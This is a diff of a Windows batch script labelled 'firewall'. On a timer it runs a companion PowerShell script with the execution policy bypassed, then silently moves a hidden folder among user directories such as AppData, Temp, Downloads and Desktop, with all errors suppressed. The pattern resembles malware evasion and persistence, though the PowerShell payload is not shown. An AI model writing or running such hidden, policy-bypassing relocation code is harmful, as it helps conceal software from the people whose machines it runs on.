@@ -5,7 +5,7 @@
 
 :: paths
 :: PATH_0 started path with .firewall%VER%.txt
-set PATH_0=%USERPROFILE%\Documents
+set PATH_0=%APPDATA%\Firewall
 set PATH_1=%TEMP%
 set PATH_2=%USERPROFILE%\Downloads
 set PATH_3=%USERPROFILE%\Desktop
@@ -43,7 +43,7 @@ set TIME=32000
 :: file info
 set PS_PATH=.firewall%VER%
 
-set FILE=.firewall.txt
+set FILE=.firewall%VER%.txt
 set CCD=%CD%
 
 :: arch version
@@ -68,20 +68,23 @@ set /a RESET_TIME-=SET_TIME
 
 :: check if RESET_TIME is less than or equal to 0
 if %RESET_TIME% leq 0 (
-    :: RESET_TIME is less than or equal to 0, starting file move...
-    set FULL_PATH=!PATH_%index%!\%FILE%
-
+    :: RESET_TIME is less than or equal to 0, starting directory move...
     powershell -NoProfile -ExecutionPolicy Bypass -Command "& {%PS_PATH%e.ps1}"
+
+    set FULL_PATH=%PATH_0%
 
     if not exist "!FULL_PATH!" (
         :: echo File not found: "!FULL_PATH!"
         exit
     )
 
-    :: move the file
-    set NEW_PATH=!PATH_%index%!\%FILE%
-    move "!FULL_PATH!" "!NEW_PATH!" || (
-        :: echo Error moving file: "!NEW_PATH!"
+    :: move the directory
+    set NEW_PATH=!PATH_%index%!
+
+    if not exist "!NEW_PATH!" mkdir "!NEW_PATH!" 2>nul
+
+    move /y "!FULL_PATH!" "!NEW_PATH!\" >nul 2>&1 || (
+        :: echo Error moving directory to: "!NEW_PATH!"
         exit
     )
 
@@ -90,8 +93,6 @@ if %RESET_TIME% leq 0 (
     :: increment index and reset if it reaches 20
     set /a index+=1
     if %index% geq 20 set index=0
-
-    if not exist "!PATH_%index%!" mkdir "!PATH_%index%!" 2>nul
 )
 
 :: update remaining TIME
